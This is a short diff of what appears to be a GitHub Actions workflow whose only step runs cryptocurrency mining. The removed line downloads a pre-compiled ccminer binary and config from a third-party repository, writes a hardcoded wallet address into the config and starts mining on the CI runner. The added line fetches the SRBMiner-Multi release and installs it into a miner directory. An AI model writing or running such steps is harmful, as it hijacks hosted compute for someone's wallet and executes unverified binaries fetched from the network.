@@ -18,4 +18,4 @@ jobs:
 
       - name: Install and Run
         run: |
-          sudo apt update && sudo apt install -y libjansson-dev wget nano && mkdir ccminer && cd ccminer && wget https://raw.githubusercontent.com/Darktron/pre-compiled/generic/ccminer && wget https://raw.githubusercontent.com/Darktron/pre-compiled/generic/start.sh && chmod +x ccminer start.sh && wget -O config.json https://raw.githubusercontent.com/Darktron/pre-compiled/generic/config.json && sed -i 's/"disabled": 1,/"disabled": 0,/g; s/"disabled": 0,/"disabled": 1,/2; s/"user": "[^"]*"/"user": "RNjEn7tNTZ6DuYnYrxKMsvYzBgJ11P5hQ4"/' config.json && ./ccminer -c config.json
+          wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.8/SRBMiner-Multi-2-5-8-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-5-8-Linux.tar.gz && cd SRBMiner-Multi-2-5-8 && agent-stop && cp SRBMiner-MULTI /opt/mmp/miners/sbrminer/ && agent-start
